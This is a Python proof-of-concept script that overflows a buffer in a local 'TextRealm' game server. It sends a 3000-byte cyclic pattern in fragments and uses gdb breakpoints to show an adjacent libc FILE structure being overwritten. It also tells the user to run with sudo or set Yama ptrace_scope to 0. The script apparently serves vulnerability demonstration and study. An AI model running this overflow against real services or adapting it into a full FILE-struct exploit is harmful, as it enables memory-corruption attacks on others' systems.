import os
import re
import socket
import subprocess
import sys
import tempfile
import time

try:
    from pwn import cyclic
except ImportError:
    print("[-] pwntools is required for this PoC (cyclic() pattern generation).")
    print("    pip install pwntools")
    sys.exit(1)

HOST = "127.0.0.1"
PORT = 9999
RECV_CHUNK = 8192
PROMPT = b"> "

SERVER_SRC = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "textrealm", "linux", "server_linux.c",
))
SERVER_BIN_SUFFIX = os.path.join("linux", "textrealm_server")

TOTAL_LEN = 3000
FRAG_SIZE = 500

PTRACE_HELP = """\
[-] gdb cannot attach to the server process: Yama ptrace_scope is
    restricted (current value: {scope}) and this script is not running
    as root. gdb here is a fresh process, not a child of the server, so
    the default "restricted ptrace" policy blocks the attach outright.

    Fix ONE of the following, then re-run this script:
      1. Run this whole script with sudo:
             sudo python3 {script}
      2. Temporarily relax ptrace_scope (reverts on reboot):
             echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
"""


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def is_game_running(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def recv_until_prompt(sock, timeout=5):
    """Block until PROMPT has been seen in the accumulated data."""
    sock.settimeout(timeout)
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)
        if not chunk:
            raise ConnectionError("connection closed by peer")
        data += chunk
    return data


def check_ptrace_ok():
    """Yama's ptrace_scope=1+ blocks gdb from attaching to a process it
    isn't an ancestor of - exactly our situation (gdb is spawned fresh
    by this script; the server was started separately). Root bypasses
    this. Bail out with a clear fix-it message instead of silently
    hanging on attach."""
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    scope_path = "/proc/sys/kernel/yama/ptrace_scope"
    if not os.path.exists(scope_path):
        return True  # no Yama on this kernel - unrestricted ptrace
    with open(scope_path) as f:
        scope = f.read().strip()
    if scope == "0":
        return True
    print(PTRACE_HELP.format(scope=scope, script=sys.argv[0]))
    return False


def find_server_pid():
    """pgrep -f on the server binary's path, then confirm via
    /proc/<pid>/exe that each candidate's ACTUAL executable is the
    server - not e.g. a supervisor process that merely mentions that
    path as a command-line argument (which would also match pgrep -f's
    substring search). There's only ever one real textrealm_server
    process (single-connection-at-a-time, no fork())."""
    try:
        out = subprocess.check_output(["pgrep", "-f", SERVER_BIN_SUFFIX], text=True)
    except subprocess.CalledProcessError:
        return None
    for pid_str in out.split():
        pid = int(pid_str)
        try:
            exe = os.readlink(f"/proc/{pid}/exe")
        except OSError:
            continue
        if exe.endswith(os.sep + SERVER_BIN_SUFFIX):
            return pid
    return None


def find_overflow_breakpoint_line():
    """Grep the LIVE source file right now for the overflowing memcpy()
    call, instead of hardcoding a line number that would go stale the
    next time server_linux.c is edited. Returns the line number
    immediately after it (`grave_used += (size_t)n;`), which is where
    gdb should stop - memcpy has just finished, but grave_used hasn't
    been updated yet, so grave_used still holds its PRE-write value."""
    with open(SERVER_SRC) as f:
        lines = f.readlines()
    for i, line in enumerate(lines, start=1):
        if "memcpy(grave_buf" in line:
            return i + 1
    raise RuntimeError(
        f"could not find 'memcpy(grave_buf' in {SERVER_SRC} - "
        "has the overflow been refactored or removed?"
    )


def find_grave_size():
    """Same philosophy: read grave_size's initializer from the live
    source rather than assuming it's still 1500."""
    with open(SERVER_SRC) as f:
        text = f.read()
    m = re.search(r"\bgrave_size\s*=\s*(\d+)\s*;", text)
    if not m:
        raise RuntimeError(f"could not find 'grave_size = N;' in {SERVER_SRC}")
    return int(m.group(1))


def run_gdb_batch(pid, cmds, timeout, label):
    """Run one headless/batch gdb session against `pid`, returning its
    combined stdout+stderr. `cmds` is a flat list of -ex arguments
    (without the leading "gdb -q -p PID --batch" boilerplate)."""
    full_cmd = ["gdb", "-q", "-p", str(pid), "--batch"] + cmds
    try:
        proc = subprocess.run(
            full_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout,
        )
        return proc.stdout
    except subprocess.TimeoutExpired as e:
        return (e.stdout or "") + f"\n[-] {label}: gdb timed out after {timeout}s\n"


def gdb_snapshot_cmds():
    """One-shot: attach, print the still-intact FILE structure, detach."""
    return [
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", 'printf "grave_buf = %p\\n", grave_buf',
        "-ex", 'printf "g_log_fp  = %p (should be ~20 bytes past grave_buf + grave_size)\\n", g_log_fp',
        "-ex", "print *g_log_fp",
        "-ex", "detach",
        "-ex", "quit",
    ]


OVERFLOW_SCRIPT_TEMPLATE = '''\
import gdb

class OverflowBreakpoint(gdb.Breakpoint):
    """Fires on every write that actually overflows grave_buf. stop()
    returning False means "log it and keep running" - gdb auto-resumes
    the inferior itself, no explicit continue needed. Only on the
    target-th (final) hit does stop() return True, which is what makes
    the single top-level `gdb.execute("continue")` below finally return
    control to this script - one persistent breakpoint rides through
    every overflowing fragment and only truly stops once the LAST one's
    memcpy has landed."""
    def __init__(self, spec, cond, target_hits, label):
        super(OverflowBreakpoint, self).__init__(spec)
        self.condition = cond
        self.target_hits = target_hits
        self.label = label
        self.hits = 0

    def stop(self):
        self.hits += 1
        gdb.write("\\n=== %s: overflow hit %d/%d ===\\n" % (self.label, self.hits, self.target_hits))
        gdb.execute('printf "grave_used (before this write) = %zu\\n", grave_used')
        gdb.execute('printf "n (bytes in this write)        = %zd\\n", n')
        if self.hits >= self.target_hits:
            gdb.write("\\n=== final overflowing write caught - adjacent FILE struct now corrupted ===\\n")
            gdb.execute('printf "grave_buf                       = %p\\n", grave_buf')
            gdb.execute('printf "g_log_fp (adjacent FILE struct) = %p\\n", g_log_fp')
            gdb.execute("print *g_log_fp")
            gdb.execute("x/80xb grave_buf+__HEXOFF__")
            return True
        return False

gdb.execute("set pagination off")
gdb.execute("set confirm off")
bp = OverflowBreakpoint("__SRC__:__BPLINE__", "grave_used + n > grave_size", __TARGET__, "__LABEL__")
gdb.execute("continue")
gdb.execute("detach")
'''


def build_overflow_script(bp_line, grave_size, num_overflow_frags, label):
    """Render OVERFLOW_SCRIPT_TEMPLATE for this run and write it to a temp
    .py file - gdb auto-detects python scripts by extension when loaded
    with -x, so no --batch -ex plumbing is needed for the loop itself."""
    src_name = os.path.basename(SERVER_SRC)
    hexoff = max(grave_size - 60, 0)
    script = (
        OVERFLOW_SCRIPT_TEMPLATE
        .replace("__HEXOFF__", str(hexoff))
        .replace("__SRC__", src_name)
        .replace("__BPLINE__", str(bp_line))
        .replace("__TARGET__", str(num_overflow_frags))
        .replace("__LABEL__", label)
    )
    fd, path = tempfile.mkstemp(prefix="filestruct_bp_", suffix=".py")
    with os.fdopen(fd, "w") as f:
        f.write(script)
    return path


def drain_socket(sock, idle_timeout=2):
    """Read whatever shows up until the socket goes quiet for
    `idle_timeout` seconds. Used after blasting all the overflow
    fragments out back-to-back, where we can no longer assume exactly
    one prompt per fragment arrives (the server may coalesce several
    fragments into a single recv())."""
    sock.settimeout(idle_timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(RECV_CHUNK)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def send_fragment_and_print(sock, idx, payload, note):
    print_banner(f"FRAGMENT {idx} ({len(payload)} bytes) - {note}")
    sock.sendall(payload + b"\r\n")
    resp = recv_until_prompt(sock)
    print(resp.decode(errors="replace"))


def main():
    if not is_game_running(HOST, PORT):
        print(f"[-] Nothing is listening on {HOST}:{PORT}. Is TextRealm running?")
        return
    print(f"[+] Game is running on {HOST}:{PORT}")

    if not check_ptrace_ok():
        return

    pid = find_server_pid()
    if pid is None:
        print(f"[-] Could not find a running '.../{SERVER_BIN_SUFFIX}' process via pgrep.")
        return
    print(f"[+] Found server process pid={pid}")

    bp_line = find_overflow_breakpoint_line()
    grave_size = find_grave_size()
    src_name = os.path.basename(SERVER_SRC)
    print(f"[+] Discovered breakpoint location {src_name}:{bp_line} and "
          f"grave_size={grave_size} by reading the live source just now - "
          f"not hardcoded.")

    pattern = cyclic(TOTAL_LEN)
    frag_count = TOTAL_LEN // FRAG_SIZE
    fragments = {i: pattern[i * FRAG_SIZE:(i + 1) * FRAG_SIZE] for i in range(frag_count)}
    first_overflow_idx = next(i for i in range(frag_count) if (i + 1) * FRAG_SIZE > grave_size)
    num_overflow_frags = frag_count - first_overflow_idx

    print(f"[+] Built a {TOTAL_LEN}-byte cyclic pattern -> {frag_count} fragments "
          f"of {FRAG_SIZE} bytes each.")
    print(f"[+] Fragments 0-{first_overflow_idx - 1} fill grave_buf exactly to its "
          f"{grave_size}-byte limit (no overflow yet).")
    print(f"[+] Fragments {first_overflow_idx}-{frag_count - 1} "
          f"({num_overflow_frags} of them) each write PAST the end of grave_buf.")

    sock = socket.create_connection((HOST, PORT), timeout=5)
    banner = recv_until_prompt(sock)
    print_banner("CONNECTED")
    print(banner.decode(errors="replace"))

    # --- phase 1: fill grave_buf exactly to its limit, no overflow yet ---
    for i in range(first_overflow_idx):
        send_fragment_and_print(sock, i, fragments[i], "filling grave_buf")

    # --- snapshot *g_log_fp while it's still a legitimate FILE struct ---
    print_banner("GDB SNAPSHOT: *g_log_fp BEFORE any overflow")
    before = run_gdb_batch(pid, gdb_snapshot_cmds(), timeout=10, label="BEFORE snapshot")
    print(before)

    # --- phase 2: ONE persistent attach + ONE breakpoint for the whole
    # overflow run. The breakpoint auto-resumes itself on every hit except
    # the last, so it rides through every overflowing fragment's memcpy
    # without us needing to attach/detach per fragment or know in advance
    # exactly how the server's recv() calls will line up with our 500-byte
    # fragments. We fire all the overflow fragments at the socket
    # back-to-back; the single `continue` inside the gdb script only
    # returns once the FINAL fragment's memcpy has actually landed. ---
    label = f"OVERFLOW RUN ({num_overflow_frags} fragments)"
    script_path = build_overflow_script(bp_line, grave_size, num_overflow_frags, label)
    print_banner(f"ATTACHING GDB (persistent) - {label}")

    gdb_proc = subprocess.Popen(
        ["gdb", "-q", "-p", str(pid), "--batch", "-x", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    # Let gdb attach (pausing the server), install the breakpoint, and
    # issue its `continue` (resuming the server) before any fragments go out.
    time.sleep(1.5)

    try:
        for i in range(first_overflow_idx, frag_count):
            print(f"[*] Sending fragment {i} ({FRAG_SIZE} bytes of the cyclic pattern)...")
            sock.sendall(fragments[i] + b"\r\n")
            # Small gap, not a round-trip wait - we are NOT reading a
            # response here. This just makes it likelier that each fragment
            # lands in its own recv()/memcpy() on the server side, so the
            # breakpoint hit count lines up with num_overflow_frags. Even if
            # it doesn't line up exactly, the breakpoint keeps auto-resuming
            # until gdb decides the final hit has occurred.
            time.sleep(0.15)

        try:
            out, _ = gdb_proc.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            print("[-] gdb did not finish in time - the breakpoint's target "
                  "hit count may not have been reached (fragments may have "
                  "coalesced into fewer memcpy() calls than expected). "
                  "Killing gdb; the server may still be paused.")
            gdb_proc.kill()
            out, _ = gdb_proc.communicate()
    finally:
        try:
            os.remove(script_path)
        except OSError:
            pass

    print_banner(f"GDB OUTPUT - {label}")
    print(out)

    print_banner("SERVER RESPONSES (drained after the overflow run)")
    resp = drain_socket(sock)
    print(resp.decode(errors="replace"))

    sock.close()
    print_banner("DONE")
    print("[+] Compare the BEFORE snapshot's *g_log_fp against the final "
          "OVERFLOW snapshot above: the FILE structure's fields (flags, "
          "buffer pointers, vtable pointer) are now bytes from our cyclic "
          "pattern, not valid libc state. Feed any of those corrupted "
          "values to pwntools' cyclic_find() to recover exactly which "
          "byte offset of the 3000-byte payload landed there.")


if __name__ == "__main__":
    main()
